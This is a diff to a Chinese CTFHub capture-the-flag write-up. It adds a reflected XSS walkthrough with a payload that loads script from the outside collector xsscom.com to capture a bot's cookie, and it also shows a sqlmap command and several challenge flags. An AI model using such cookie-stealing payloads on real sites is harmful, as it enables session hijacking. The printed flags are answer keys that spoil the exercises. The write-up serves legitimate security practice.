@@ -547,7 +547,7 @@ sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 
 
 ------
 
-#### 空格过滤
+#### 过滤空格
 
 输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。
 
@@ -1244,6 +1244,19 @@ ctfhub{f90b6c76f97124cd83e38e9b}
 > Hello CTFHub eyougw admin, ctfhub{8f55d6b3f8b427971ab9a45f}
 
 提交`ctfhub{8f55d6b3f8b427971ab9a45f}`即可。
+
+------
+
+### XSS
+
+#### 反射型
+
+利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。
+
+> #### What's your name 后的输入框填写 CTFHub 点击Submit
+Send URL to Bot中URL后的输入框填写`http://challenge-f218d4eec3b4f897.sandbox.ctfhub.com:10800/?name=</textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Send
+
+在接收到的内容中能看到`cookie : flag=ctfhub{c7f04cd9f2e9912994ba8f6b}`，提交即可。
 
 ------
 
